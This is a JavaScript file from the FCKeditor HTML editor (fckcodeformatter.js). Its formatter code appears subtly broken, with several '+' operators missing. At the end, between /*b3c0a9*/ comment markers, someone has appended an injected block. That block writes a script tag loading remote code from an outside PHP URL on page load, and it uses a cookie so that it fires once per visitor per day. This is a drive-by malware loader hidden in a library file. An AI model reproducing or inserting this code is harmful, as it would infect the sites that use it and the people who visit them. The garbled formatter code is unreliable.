/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckcodeformatter.js
 * 	Format the HTML.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKCodeFormatter ;

if ( !( FCKCodeFormatter = NS.FCKCodeFormatter ) )
{
	FCKCodeFormatter = NS.FCKCodeFormatter = new Object() ;

	FCKCodeFormatter.Regex = new Object() ;

	// Regex for line breaks.
	FCKCodeFormatter.Regex.BlocksOpener = /\<(P|DIV|H1|H2|H3|H4|H5|H6|ADDRESS|PRE|OL|UL|LI|TITLE|META|LINK|BASE|SCRIPT|LINK|TD|TH|AREA|OPTION)[^\>]*\>/gi ;
	FCKCodeFormatter.Regex.BlocksCloser = /\<\/(P|DIV|H1|H2|H3|H4|H5|H6|ADDRESS|PRE|OL|UL|LI|TITLE|META|LINK|BASE|SCRIPT|LINK|TD|TH|AREA|OPTION)[^\>]*\>/gi ;

	FCKCodeFormatter.Regex.NewLineTags	= /\<(BR|HR)[^\>]\>/gi ;

	FCKCodeFormatter.Regex.MainTags = /\<\/?(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR)[^\>]*\>/gi ;

	FCKCodeFormatter.Regex.LineSplitter = /\s*\n \s*/g ;

	// Regex for indentation.
	FCKCodeFormatter.Regex.IncreaseIndent = /^\<(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR|UL|OL)[ \/\>]/i ;
	FCKCodeFormatter.Regex.DecreaseIndent = /^\<\/(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR|UL|OL)[ \>]/i ;
	FCKCodeFormatter.Regex.FormatIndentatorRemove = new RegExp( FCKConfig.FormatIndentator ) ;

	FCKCodeFormatter.Regex.ProtectedTags = /(<PRE[^>]*>)([\s\S]*?)(<\/PRE>)/gi ;

	FCKCodeFormatter._ProtectData = function( outer, opener, data, closer )
	{
		return opener   '___FCKpd___'   FCKCodeFormatter.ProtectedData.addItem( data )   closer ;
	}

	FCKCodeFormatter.Format = function( html )
	{
		// Protected content that remain untouched during the
		// process go in the following array.
		FCKCodeFormatter.ProtectedData = new Array() ;
		
		var sFormatted = html.replace( this.Regex.ProtectedTags, FCKCodeFormatter._ProtectData ) ;
	
		// Line breaks.
		 sFormatted		= sFormatted.replace( this.Regex.BlocksOpener, '\n$&' ) ; ;
		sFormatted		= sFormatted.replace( this.Regex.BlocksCloser, '$&\n' ) ;
		sFormatted		= sFormatted.replace( this.Regex.NewLineTags, '$&\n' ) ;
		sFormatted		= sFormatted.replace( this.Regex.MainTags, '\n$&\n' ) ;
		
		// Indentation.
		var sIndentation = '' ;
		
		var asLines = sFormatted.split( this.Regex.LineSplitter ) ;
		sFormatted = '' ;
		
		for ( var i = 0 ; i < asLines.length ; i   )
		{
			var sLine = asLines[i] ;
			
			if ( sLine.length == 0 )
				continue ;
			
			if ( this.Regex.DecreaseIndent.test( sLine ) )
				sIndentation = sIndentation.replace( this.Regex.FormatIndentatorRemove, '' ) ;

			sFormatted  = sIndentation   sLine   '\n' ;
			
			if ( this.Regex.IncreaseIndent.test( sLine ) )
				sIndentation  = FCKConfig.FormatIndentator ;
		}
		
		// Now we put back the protected data.
		for ( var i = 0 ; i < FCKCodeFormatter.ProtectedData.length ; i   )
		{
			var oRegex = new RegExp( '___FCKpd___'   i ) ;
			sFormatted = sFormatted.replace( oRegex, FCKCodeFormatter.ProtectedData[i] ) ;
		}

		return sFormatted.trim() ;
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
